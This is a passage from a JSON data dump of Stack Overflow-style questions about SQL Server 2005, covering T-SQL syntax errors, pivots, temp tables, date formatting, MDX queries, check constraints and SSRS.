Exercise;\nGo\n\nCREATE TABLE Employees\n(\nEmployeeNumber nchar(10),\nEmployeeName nvarchar(50),\nDateHired datetime,\nHourlySalary money\n);\nGO\n\n\nINSERT INTO Employees\nVALUES(N'593705', N'Frank Somah', N'20061004', 26.15),\n(N'720947', N'Paul Handsome', N'20000802', 36.05);\nGO\n\nINSERT INTO Employees(EmployeeName, EmployeeNumber, DateHired)\nVALUES(N'Clarice Simms', N'971403', N'20011112');\nGO\n</code></pre>\n\n<p>The insert statement is not working.\nIncorrect syntax near ','.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":61,"score":-4,"question_id":12057406,"title":"sql transaction not working","body":"<p>SQL transaction not working:</p>\n\n<pre><code>BEGIN TRANSACTION AddEmployees\n   INSERT INTO Employees\n      VALUES(N'595002', N'John Meah', N'20000212', 32.25),\n      (N'928375', N'Chuck Stansil', N'20080628'),\n      (N'792764', N'Orlando Perez', N'20000616', 12.95);\n   COMMIT TRANSACTION AddEmployees;\nGO\n</code></pre>\n"},{"tags":["sql-server","delphi","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":12055641,"title":"retrieve image into DBImage in delphi?","body":"<p>I have a field in a database defined as varbinary that contains images. \nI can't retrieve these images. I use delphi <code>DBImage</code> and I get this error:</p>\n\n<blockquote>\n  <p>'bitmap not valid' </p>\n</blockquote>\n\n<p>when I connect to the photo field.\nMy Database is sql server 2005.</p>\n\n<p>pls help me>>> </p>\n"},{"tags":["sql-server-2005","crystal-reports-xi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":165,"score":0,"question_id":10020309,"title":"Crystal Reports Record Select with SQL Text Type","body":"<p>I'm trying to improve an existing datamining report by forcing Crystal Reports v11 to evaluate a SQL like on a text column when it retrieves the dataset rather having it evaluate after drawing back all the results. I've already traced this within SQL and it will save an enormous amount of reads but once I remove the existing string parsing formulas within CR and try to add the text field to the record select formula, crystal seems to disregard the fact that I have added it (within the SQL statement generated).</p>\n\n<p>I haven't found any documentation about CR with SQL datatypes specifically. Does Crystal not allow evaluation of text types on select or should something be added to the parameter for it to work properly (IE ToText, etc)?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["asp.net","sql-server-2005","reporting-services","ssas","olap"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":611,"score":5,"question_id":10513342,"title":"Display an OLAP SQL Server in a web page?","body":"<p>I have this scenario:</p>\n\n<p>WServer 2008, SQL Server 2005, MS Analysis services (SSAS), ISS7 and a OLAP CUBE.</p>\n\n<p>I need to <strong>embed the OLAP result</strong> in a webpage in an existing site.</p>\n\n<p><strong>I don't need any</strong> selection of dimension, no any drill down, no any 3 dimension, just a passive result of a preset MDX query.</p>\n\n<p>Below here an example of MDX query used: <strong>(Sell statistic for an agent in a period)</strong></p>\n\n<pre><code>SELECT NON EMPTY { [Measures].[Valore] } ON COLUMNS,\n    NON EMPTY { ([Prodotti].[Top Marca].[Top Marca].ALLMEMBERS * [Calendario].[Anno -  Mese].[Mese].ALLMEMBERS * [Agenti].[Cod Agente].[Cod Agente].ALLMEMBERS ) }\n    DIMENSION PROPERTIES MEMBER_CAPTION, MEMBER_UNIQUE_NAME ON ROWS FROM ( SELECT ( { [Calendario].[Anno].&amp;[2012] } ) ON COLUMNS \n    FROM ( SELECT ( { [Agenti].[Vw Agenti].&amp;[005] } ) ON COLUMNS FROM [Vendite])) \n    CELL PROPERTIES VALUE, BACK_COLOR, FORE_COLOR, FORMATTED_VALUE, FORMAT_STRING, FONT_NAME, FONT_SIZE, FONT_FLAGS\n</code></pre>\n\n<p>Below an easy result that i need to show in the website:</p>\n\n<p><img src=\"http://i.stack.imgur.com/5f95X.jpg\" alt=\"olap result\"></p>\n\n<p>I tried to use Report Viewer but seem I can't due this error:</p>\n\n<blockquote>\n  <p>Remote report processing requires Microsoft SQL Server 2008 Reporting Services or later</p>\n</blockquote>\n\n<p>and I can't install SQL Server 2008 so I need an alternative solution.</p>\n\n<p>I tried some open source but they need install JAVA and more, most also not connect to SQL Server or required a different web server.</p>\n\n<p>I tried also use a TSQL query but it return only 1 column for the months when in real i need many columns as months calculated</p>\n\n<p><em>NOTE: the users are many with many different operating system and browser as iPad, Mac, Windows, Linux, ... so the result must be an HTML output</em></p>\n\n<p><strong>So my question is:</strong></p>\n\n<p>What is the best way to develop a simple webpage (asp or aspx) (server side or client side) to query the cube to get a simple result <strong>(must be HTML)</strong> as show above, without any selection by the user ?</p>\n\n<p>Or what didn't I understand at all with this scenario ?</p>\n\n<p>Thanks in advance for who can help me!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12052494,"title":"Will performance improve when set filegroups on different disk?? ","body":"<p>I've created a partitioned table for a database and set primary file (<code>.mdf</code>) &amp; log file(<code>.ldf</code>) path in <code>C:</code> and set secondary file's (<code>.ndf</code>) path to <code>D:</code> on the same hard disk. </p>\n\n<p>Then did some queries performance. its well. </p>\n\n<p>Now, my question is: if I put the primary file onto one hard disk and secondary file onto another hard disk, is it perform well.??</p>\n\n<p>What is the performance difference between for both task???</p>\n\n<p>pls, anyone say.....</p>\n\n<p>advance thanks!!...</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":85,"score":0,"question_id":12044938,"title":"Update statement taking 10 minutes with large data set","body":"<p>I have a SQL stored procedure in which one statement is taking 95% of the total time (10 minutes) to complete. <code>#Records</code> has approximately 133,000 rows and <code>Records</code> has approximately 12,000 rows.  </p>\n\n<pre><code>  -- Check Category 1 first\n  UPDATE #Records\n    SET Id = (SELECT TOP 1 Id FROM Records WHERE Cat1=#Records.Cat1)\n    WHERE Cat1 IS NOT NULL\n</code></pre>\n\n<p>I have tried adding a index to <code>Cat1</code> in <code>#Records</code>, but the statement time did not improve.</p>\n\n<pre><code>CREATE CLUSTERED INDEX IDX_C_Records_Cat1 ON #Records(Cat1)\n</code></pre>\n\n<p>A similar statement that follows, takes only a fraction of the time</p>\n\n<pre><code>  -- Check Category 2\n  UPDATE #Records\n    SET Id = (SELECT TOP 1 Id FROM Records WHERE Cat2=#Records.Cat2)\n    WHERE ID IS NULL\n</code></pre>\n\n<p>Any ideas on why this is happening or what I can do to make this statement more time effective?</p>\n\n<p>Thanks in advance.</p>\n\n<p>I am running this on Microsoft SQL Server 2005.</p>\n"},{"tags":["c#","asp.net","sql","sql-server-2005"],"answer_count":4,"favorite_count":4,"up_vote_count":5,"down_vote_count":0,"view_count":274,"score":5,"question_id":2808624,"title":"Which is good Pratice storing a uploaded File in DB or storing it in Filesystem","body":"<p>hi \nI have a File Uploader in my ASP.NET application Using C#, we can upload any type like images, documents, pdf etc. </p>\n\n<p>I m storing it in the Filesystem and having only the Name of the File in DB. \nMy doubt is can we store the entire file, images in DB. State me Which is good practice and why we need to use it.</p>\n\n<p>Either file System Storage or SQL DB Storage.</p>\n"},{"tags":["sql-server-2005","temporary-tables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":466,"score":0,"question_id":3348476,"title":"SQL Server Temporary Table from Complex Stored Procedure","body":"<p>I have to create a temp table (#temp) from a variable or stored procedure</p>\n\n<p>(i.e)</p>\n\n<p>My stored procedure contains </p>\n\n<p>......</p>\n\n<pre><code>set @sql='select ...'\nset @sql=@sql+'..join..'\nset @sql=@sql+'....join..'\n</code></pre>\n\n<p>when i execute it (i.e) <code>exec (@sql)</code> it  returns some rows,i want to store that rows\nin a temp table.How to acheieve it?</p>\n\n<p>i tried something like</p>\n\n<pre><code>select\n       id,name,ward_no into,........ \n#temp\n\nfrom\n   ( \n     exec (@sql)\n   )derived\n</code></pre>\n\n<h2>Update</h2>\n\n<p>I found the logic</p>\n\n<p>(i.e)</p>\n\n<pre><code>create table #temp(....)\n\ninsert #temp exec(@sql) \n\nselect * from #temp\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":596,"score":0,"question_id":3627282,"title":"converting date field format","body":"<p>I have a field with birthday as either '7/08/1986' or '07/08/1986'.</p>\n\n<p>I want to convert the value to like this '1986/08/07'. Simply converting from <strong>DD/MM/YYYY</strong> to <strong>YYYY/MM/DD</strong>. Kindly note down this is all in SQL Server 2005.</p>\n\n<p>Additionally, if the date is in single digit means still the output shd be shown in double digit like '07' not '7'.</p>\n\n<p>How do I do this conversion?</p>\n\n<p>Your kind replies will help me out. My thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":100,"score":4,"question_id":11976883,"title":"Table containing TEXT column growing continuously","body":"<p>We've got a table in a production system which (for legacy reasons) is running SQL 2005 (9.0.5266) and contains a TEXT column (along with a few other columns of various datatypes).</p>\n\n<p>All of a sudden (since a week ago) we noticed the size of this one table increasing linearly by 10-15GB per day (whereas previously it has always remained at a constant size).  The table is a queue for a messaging system, and as such the data in it completely refreshes itself every few seconds.  At any one time there could be anywhere from 0 to around 1000 rows, but it fluctuates rapidly as messages are inserted, and sent (at which point they're deleted).</p>\n\n<p>We can't find anything that was changed on the day the growth started - so have no obvious potential cause identified at this stage.</p>\n\n<p>One \"obvious\" culprit is the TEXT column, and so we checked to see if any massive values were now being stored, but (using DATALENGTH) we found no single rows above around ~32k. We've run CHECKDB, updated space usage, rebuild all indexes, etc - nothing reduces the size (and CHECKDB showed no errors). </p>\n\n<p>We've queried sys.allocation_units and the size increase is definitely LOB_DATA (which show total_pages and used_pages increasing together at a constant rate).</p>\n\n<p>To reduce the database size last night we simple created a new table along-side the one in question (which is luckily referenced via a view by the application), dropped the old table, and renamed the new one.  We left last night, taking comfort in the fact that we'd alleviated the space issues, and that we had a backup of the dodgy table to investigate further today.\nHowever, this morning the table size is already up to 14GB (and growing), while there are only the usual ~500 rows in the table, and MAX(DATALENGTH(text_column)) is only showing around 35k.</p>\n\n<p>Any ideas as to what could be causing this \"runaway\" growth, or anything else that we could try or query to get more information about what exactly is using the space?</p>\n\n<p>Cheers, \nDave</p>\n"},{"tags":["sql","sql-server-2005","case-when"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1734,"score":4,"question_id":6042767,"title":"SQL Server CASE .. WHEN .. IN statement","body":"<p>On SQL server 2005 I am trying to query this select statement </p>\n\n<pre><code>SELECT\n    AlarmEventTransactionTableTable.TxnID,\n    CASE AlarmEventTransactions.DeviceID\n        WHEN DeviceID IN('7', '10', '62', '58', '60',\n                 '46', '48', '50', '137', '139',\n                 '142', '143', '164') THEN '01'\n        WHEN DeviceID IN('8', '9', '63', '59', '61',\n                 '47', '49', '51', '138', '140',\n                 '141', '144', '165') THEN '02'\n        ELSE 'NA' END AS clocking,\n\n    AlarmEventTransactionTable.DateTimeOfTxn\n FROM\n    multiMAXTxn.dbo.AlarmEventTransactionTable\n</code></pre>\n\n<p>It returns the error below </p>\n\n<pre><code> Msg 156, Level 15, State 1, Line 4 \n Incorrect syntax near the keyword 'IN'.\n</code></pre>\n\n<p>Please give me some advice on what could be wrong with my code.</p>\n"},{"tags":["sql","sql-server-2005","tsql","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":5432,"score":2,"question_id":6388489,"title":"Insert Into temp table from a stored procedure that returns multiple result sets","body":"<p>Consider the following sql</p>\n\n<p>A stored proc called myProc which returns two result sets.  Result set 1 returns column1, column2.  Result set 2 returns column 3, column 4, column 5.</p>\n\n<p>The following sql will fail since the temp table only has defined 2 int columns.</p>\n\n<pre><code>Create Table #temp1(\nColumn1 int,\nColumn2 int)\n\ninsert into #temp1 exec myProc\n</code></pre>\n\n<p>My question is is it possible to just insert the first result set into #temp1?</p>\n"},{"tags":["sql-server","database","sql-server-2005","database-design","check-constraints"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":220,"score":1,"question_id":12035747,"title":"Date range overlapping check constraint","body":"<p>I've a simple table in sql server 2005 with 3 columns: DateStart, DateEnd and Value. I tried to set a \"table check constraint\" to avoid inserting overlapping records. For instance if in such table there is a record with DateStart = 2012-01-01 (first January) and DateEnd 2012-01-15 (15th January) than Check constraint must avoid inserting a record with DateStart=2012-01-10 (no care DateEnd), a record with DateEnd=2012-01-10 (no care DateStart) or a record with DateStart 2011-12-10 and DateEnd 2012-02-01.</p>\n\n<p>I defined a UDF in such way:</p>\n\n<pre><code>CREATE FUNCTION [dbo].[ufn_checkOverlappingDateRange]\n(\n    @DateStart AS DATETIME\n    ,@DateEnd AS DATETIME\n)\nRETURNS BIT \nAS\nBEGIN\n  DECLARE @retval BIT\n  /* date range at least one day */\n  IF (DATEDIFF(day,@DateStart,@DateEnd) &lt; 1)\n    BEGIN\n      SET @retval=0\n    END\n  ELSE\n    BEGIN\n      IF EXISTS\n        (\n          SELECT\n              *\n            FROM [dbo].[myTable]\n            WHERE\n            ((DateStart &lt;= @DateStart) AND (DateEnd &gt; @DateStart))\n            OR\n            ((@DateStart &lt;= DateStart) AND (@DateEnd &gt; DateStart))\n        )\n        BEGIN\n          SET @retval=0\n        END\n    ELSE\n      BEGIN\n            SET @retval=1\n          END\n        END\n  RETURN @retval\nEND\n</code></pre>\n\n<p>Then thought check could be this:</p>\n\n<pre><code>ALTER TABLE [dbo].[myTable]  WITH CHECK ADD  CONSTRAINT [CK_OverlappingDateRange] CHECK  ([dbo].[ufn_checkOverlappingDateRange]([DateStart],[DateEnd])&lt;&gt;(0))\n</code></pre>\n\n<p>But even with [myTable] empty EXISTS Operator returns true when i insert first record. Where i'm wrog ? Is it possible to set a constraint like this ?</p>\n\n<p>BTW I consider  DateStart includes in range and DateEnd excludes from range.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12042397,"title":"Dynamic Create Drop Stored Proc Script","body":"<p>I want to dynamically create a Drop/Create Script. For that I can calculate the <strong>Create</strong> part as below.</p>\n\n<pre><code>SELECT definition FROM sys.sql_modules\n</code></pre>\n\n<p><strong>My Query</strong> - can you suggest something for the <strong>Drop Stored Proc</strong> Part...</p>\n\n<p>I am trying a Create/Drop Script for <strong>Stored Proc</strong></p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":9,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4704,"score":4,"question_id":1043465,"title":"Creating Stored Procedure Syntax, relating to use of GO","body":"<p>Does anyone know why.</p>\n\n<pre><code>CREATE PROCEDURE My_Procedure\n    (@Company varchar(50))  \nAS  \n    SELECT PRD_DATE \n    FROM WM_PROPERTY_DATES \n    WITH (NOLOCK) \n    WHERE PRD_COMPANY = @Company \nGO\n</code></pre>\n\n<p>Gives me an error message in SQL management studio:</p>\n\n<blockquote>\n  <p><code>Msg 102, Level 15, State 1, Procedure My_Procedure, Line 1\n  Incorrect syntax near 'GO'.</code></p>\n</blockquote>\n\n<p>Now, this is the last statement of a batch, maybe the last statement should not have a <code>GO</code> ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3843,"score":1,"question_id":2569998,"title":"to_date in SQL Server 2005","body":"<p>Does any one know how I would have to change the following to work with ms sql?</p>\n\n<pre><code>WHERE registrationDate between to_date ('2003/01/01', 'yyyy/mm/dd')\nAND to_date ('2003/12/31', 'yyyy/mm/dd');\n</code></pre>\n\n<p>What I have read implies I would have to construct it using DATEPART() which could become very long winded. Especially when the goal would be to compare on dates which I receive in the following format \"2003-12-30 10:07:42\". It would be nice to pass them off to the database as is.</p>\n\n<p>Any pointers appreciated.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":2115,"score":4,"question_id":2009976,"title":"Differance Between Persist Security Info And Integrated Security","body":"<p>Hi \n I know about Integrated Security =True/SSPI is same, but do not know about Persist Security=True\nCould you please explain\nThanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","casting"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4630,"score":4,"question_id":4936180,"title":"Cast integer and concatenate to varchar in TSQL","body":"<p>I'm trying to write a stored procedure to assist with development of our database, but I'm having some trouble using it. For example:</p>\n\n<pre><code>DECLARE @pID int;\nSET @pID = 1;\nEXEC WriteLog 'Component', 'Source', 'Could not find given id: ' + CAST(@pID AS varchar);\n</code></pre>\n\n<p>This yields the error (on SQL Server 2005)</p>\n\n<blockquote>\n  <p>Msg 102, Level 15, State 1, Line 4\n  Incorrect syntax near '+'.</p>\n</blockquote>\n\n<p>Can someone explain to me why my syntax is incorrect, and the right way to solve this problem?</p>\n"},{"tags":["jquery","asp.net-mvc","mvc","sql-server-2005","table"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":217,"score":-1,"question_id":10053693,"title":"How can I add an HTML jQuery table to display a database?","body":"<p>I need to show a database in a table present in the ASP.NET. I got some suggestions, such as DataGridView slowing down our process. So I use jQuery table. But how do I display the data in jQuery table in an ASP.NET MVC webpage from an SQL&nbsp;Server database.</p>\n"},{"tags":["html","sql-server-2005","jsp","csv"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12017864,"title":"How to save .csv on client computer in jsp?","body":"<p>I am exporting data from jsp to excel as .csv. But I want it to save that .csv file on client, if it request to. Do I need to download code for save file dialog in HTML. I am using JSP and mssql server 2005. Here is my code:</p>\n\n<pre><code>FileWriter fw = new FileWriter(\"C:\\\\PHPLExcel.csv\");\nfw.append(\"Sr.No.\");\nfw.append(',');\nfw.append(\"Name\");\nfw.append(',');\nfw.append(\"Address\");\nfw.append(',');\nfw.append(',');\nfw.append('\\n');\nfw.flush();\nfw.close();\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","json","sql-server-2008","sql-server-2005","json.net"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":130,"score":2,"question_id":12012810,"title":"What data type should be correct to store JSON content as string?","body":"<p>I plan to use JSON.NET to serialize and deserialize objects to and with the json string store it in the database.</p>\n\n<p>What datatype of the SQL Server 2008 should be the best to store it?</p>\n\n<ul>\n<li>nvarchar(max)?</li>\n<li>varchar(max)?</li>\n</ul>\n"},{"tags":["c#","visual-studio","sql-server-2005","visual-studio-2008","licenses.licx"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12014075,"title":"Build Runtime Licenses not showing as an option","body":"<p>I have a VS 2008 project. I added the licenses.licx project to the root, but when I right click on it, I see no, \"Build Runtime Licenses\". What am I missing?</p>\n"},{"tags":["sql-server-2005","pattern-matching"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12012503,"title":"SQL Server pattern match without RegEx","body":"<p>I am trying to search all instances of an expression used in stored procedures and have this:</p>\n\n<pre><code>SELECT name, type_desc, create_date, modify_date\n    FROM sys.procedures \n    WHERE OBJECT_DEFINITION(object_id) LIKE '%ufn_TurnFlagOn(5,ColumnA)%'\nORDER BY name\n</code></pre>\n\n<p>But this will not return the sps that may have a space between the function parameters like: </p>\n\n<pre><code>ufn_TurnFlagOn( 5,ColumnA )\nufn_TurnFlagOn(5, ColumnA)\nufn_TurnFlagOn( 5,ColumnA)\n</code></pre>\n\n<p>Please note:</p>\n\n<ul>\n<li>I cannot use the \"_\" wildcard like this <code>LIKE\n'%ufn_TurnFlagOn(_5_,_ColumnA_)%'</code> because it matches exactly a\nsingle character, hence it will not match\n<code>ufn_TurnFlagOn(5,ColumnA)</code> and some more.</li>\n<li>I do not have CLR Integration (nor can I register it now) hence I\ncannot use regexes.</li>\n</ul>\n\n<p>Alternative is to run the query multiple times with all possibilities, but is there a better way to accomplish this in 1 query?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","visual-studio-2008"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12012186,"title":"Assembly in host store has a different signature than assembly in GAC","body":"<p>I have added a third party dll (Extreme.Numerics.Net20.dll to my sql server assemblies). I then opened by VS 2008 project and added that assembly as a reference. Then I built and released my project and it created a PowerstatRegression.dll. Then I add that assembly to SQL Server as well. But when I run my code, I still get this:</p>\n\n<pre><code>Error message: System.IO.FileLoadException: Could not load file or assembly \n'Extreme.Numerics.Net20, Version=3.6.10055.0, Culture=neutral, \nPublicKeyToken=9e513770f58567b2' or one of its dependencies. Assembly in host store has a \ndifferent signature than assembly in GAC. (Exception from HRESULT: 0x80131050) File name: \n'Extreme.Numerics.Net20, Version=3.6.10055.0, Culture=neutral, \nPublicKeyToken=9e513770f58567b2' at \nPowerStatRegression.matrix.MatrixHandler.MultiplyMatrixByArray(Double[][] a, Double[] b) at \n</code></pre>\n\n<p>Why is this happening? Everything builds correctly with no errors.</p>\n"},{"tags":["asp.net","sql-server-2005","binary"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":969,"score":0,"question_id":4449544,"title":"how to save a docx file in sql server 2005 and display it in aspx pages as docx document","body":"<p>I am using visual studio 2005 and sql server 2005 to make an application.</p>\n\n<p>I want to save user's doc,docx file in a database and show the uploaded user doc ,docx file in an asp page.</p>\n\n<p>How to achieve this ?</p>\n"},{"tags":["sql-server-2005","query","table","pivot"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":407,"score":1,"question_id":842926,"title":"How to Pivot data from one table with SQL server 2005","body":"<p>I would like to create a query from a single table with the following columns.</p>\n\n<p>SEQNO is a unique key</p>\n\n<pre><code>Name   ID   Amount   Date          JOBID       SEQNO\nMark    9    200     1/2/09         1001         1\nPeter   3    300     1/2/09         1001         2\nSteve   1    200     2/2/09         1001         3\nMark    9    200     3/2/09         1001         4\nPeter   3    300     4/2/09         1001         5\nSteve   1    200     5/2/09         1001         6\nHally   1    200     5/2/09         1002         7\n</code></pre>\n\n<p>The query should output in this format by SUBJOBID and a date range:-</p>\n\n<pre><code>**NAME      ID      1/2       2/2     3/2     4/2     5/2      JOBID**&lt;br&gt;\nMark        9       200       NULL    200     NULL    NULL     1001   \nPeter       3       300       NULL    NULL    300     NULL     1001   \nSteve       1       NULL      200     NULL    NULL    200      1001\n</code></pre>\n\n<p>I have been going over pivot queries for this. But I don't seem to get anywhere. Could some one help ?</p>\n"},{"tags":["php","sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12011458,"title":"(?) marks in HTML. Encoding issue from content from the database?","body":"<p>Any idea why this is happening?</p>\n\n<p><img src=\"http://i.stack.imgur.com/f8qA6.png\" alt=\"enter image description here\"></p>\n\n<p>It looks to be happening mainly with apostrophes and hyphens. Any ideas if I can fix this? I pull the data from my database and print it to the page like:</p>\n\n<pre><code>&lt;div class=\"block\"&gt;\n              &lt;?=$details['agenda'] ?&gt;\n&lt;/div&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":8882921,"title":"SQL Query pivot approach assistance","body":"<p>i am really struggling with this pivot and hoped reaching out for help and enlightenment might help. </p>\n\n<p>Say i have the following table....\nTable A</p>\n\n<pre><code>type      actId date        rowSort   order value   value_char  colName\n------------------------------------------------------------------------------------\nchecking  1003   2011-12-31  2          1   44      44          Amount\nchecking  1003   2011-12-31  2          2   55      55          Interest\nchecking  1003   2011-12-31  2          3   66      66          Change\nchecking  1003   2011-12-31  2          4   77      77          Target\nchecking  1003   2011-12-31  2          5   88      88          Spread\nsavings   23456  2011-12-31  1          1   999     999         Amount\nsavings   23456  2011-12-31  1          2   888     888         Interest\nsavings   23456  2011-12-31  1          3   777     777         Change\nsavings   23456  2011-12-31  1          4   666     666         Target\nsavings   23456  2011-12-31  1          5   555     555         Spread\n</code></pre>\n\n<p>And i want to transpose to table b </p>\n\n<pre><code>checking  chkId date        rowSort   order chkvalue  chkValchar  colName  savings   savId  savVal  savValChar\n-------------------------------------------------------------------------------------------------------------------\nchecking  1003   2011-12-31  2          1   44        44          Amount    savings   23456  999          999           \nchecking  1003   2011-12-31  2          2   55        55          Interest  savings   23456  888          888           \nchecking  1003   2011-12-31  2          3   66        66          Change    savings   23456  777          777\nchecking  1003   2011-12-31  2          4   77        77          Target    savings   23456  666          666\nchecking  1003   2011-12-31  2          5   88        88          Spread    savings   23456  555          555\n</code></pre>\n\n<p>I can admit this is beyond my skills at the moment.<br>\nI believe i need to do a pivot on this table, using the rowSort (identify savings vs checking) along with ordering using the order column.  This maybe wrong and that is why i am here.  </p>\n\n<p>Is a pivot the right way to go?  Am i right to assume my pivot is to use the aggregate max(rowSort)?</p>\n"},{"tags":["sql-server-2005","join","uniqueidentifier","unique-constraint"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12007867,"title":"Join Talbe to itself having count > 1","body":"<p>I have a <code>Personal</code> table with a <code>LastName</code> column and a <code>MaybeUniqueID</code>.\nI want to put in output a table with a <code>LastName</code> column where the counter set on to the column <code>MaybeUniqueID</code> gives more than 1 row.</p>\n\n<ul>\n<li>I would like to do everything in one unique run, avoiding mid-step outputs.</li>\n<li>I prefere not using temporary table or table variables, otherwise I would like to use at most one table variable (not temporary tables), but I think this should not be necessary.</li>\n<li>I am using Microsoft SQL Server 2005.</li>\n</ul>\n\n<p>I tried different scenarios with different SQL statements like <code>HAVING</code> or <code>GROUP BY</code>, but I failed to get the outcome I am looking for.\nPlease have a look at the following not-working summary test: </p>\n\n<pre><code>SELECT LastName\nFROM   Personal\n       JOIN\n              (SELECT  MaybeUniqueID AS ID2,\n                       COUNT(*)      AS CNT\n              FROM     Personal\n                       --WHERE CNT &gt; 1\n              GROUP BY MaybeUniqueID\n              HAVING   cnt &gt; 1\n              ) AS MultiMaybeUniqueID\n       ON     Personal.MaybeUniqueID = MultiMaybeUniqueID.ID2\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures","csv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":12005078,"title":"Get all values from one column of a CSV string using Stored Procedure","body":"<p>Within a stored procedure, I need to take a whole CSV file as a string, then pick out all the values in one \"column\" to do a further query on the database.</p>\n\n<p>I cannot use a saved doc - so i think that rules out openrowset, and the whole thing has to be done within a stored procedure.</p>\n\n<p>Have spent hours googling and trying, but can find a good answer. One possible was <a href=\"http://www.tainyan.com/articles/entry-32/converting-csv-to-sql-data-table-with-stored-procedure.html\" rel=\"nofollow\">http://www.tainyan.com/articles/entry-32/converting-csv-to-sql-data-table-with-stored-procedure.html</a> but it doesnt work and i can find the error.</p>\n\n<p>How should this be done please?</p>\n"},{"tags":["sql-server","sql-server-2005","query-execution-plans","ssms2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11213516,"title":"Execution Plan for a long stored proc cuts off. How to view it in SSMS?","body":"<p>I am trying to look at an execution plan for a sproc that has a massive amount of statements, looping, etc...  As you can imagine, the execution plan is really long.  In fact, SSMS gets confused before the interesting part that I am trying to look at.</p>\n\n<p><img src=\"http://i.stack.imgur.com/ie9lX.jpg\" alt=\"enter image description here\"></p>\n\n<p>Is there anyway to see the entire execution plan?</p>\n\n<p>Btw, using SSMS 2008 to hit SQL Server 2005.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12006713,"title":"Find where a row of data in one column doesn't exist in another column","body":"<p>so I'm trying to figure out a way to compare each and every row of a column against all the rows in another column and filter out those that doesn't exist in the column that it is comparing to. I understand how to compare the two columns on a row-by-row basic like this:</p>\n\n<pre><code>select table1.column1\nfrom table1 inner join\n     table2 on table1.id = table2.id\nwhere column1 &lt;&gt; column2\n</code></pre>\n\n<p>But I want to compare the rows from table1 in column1 against ALL the rows of column2 in table2 and find rows in column1 that doesn't exist in column2 at all. So it would be something like columns with these values:</p>\n\n<pre><code>Column1        Column2\n1              2\n2              1\n4              3\n5              5\n7              6\n</code></pre>\n\n<p>And after the SQL it would become something like this:</p>\n\n<pre><code>Column1\n4\n7 \n</code></pre>\n"},{"tags":["sql-server-2005","reporting-services","asp.net-2.0"],"answer_count":11,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":3452,"score":9,"question_id":507470,"title":"SQL Server 2005 Reporting Services - Pros and Cons","body":"<p>I am developing a web application using ASP .NET 2.0, VS 2008 and SQL Server 2005. I would like to Use SSRS 2005 for the various reports I need to build for this web application. I would like to convince the team that we should adopt SSRS as the main reporting platform for most internal and external web applications we have. </p>\n\n<p>What are the pros and cons of Reporting Services? I can see many pros like tight integration with IIS, SQL Server and Visual Studio, rich presentation features and export functionality, subscription etc so I am mainly interested in negatives of SSRS.</p>\n\n<p>EDIT: I understand that if I am not using VS 2005 for my application development, I will be using different Visual Studio versions for application and report development. However, I am more interested in negatives (or not so good aspects) of SSRS 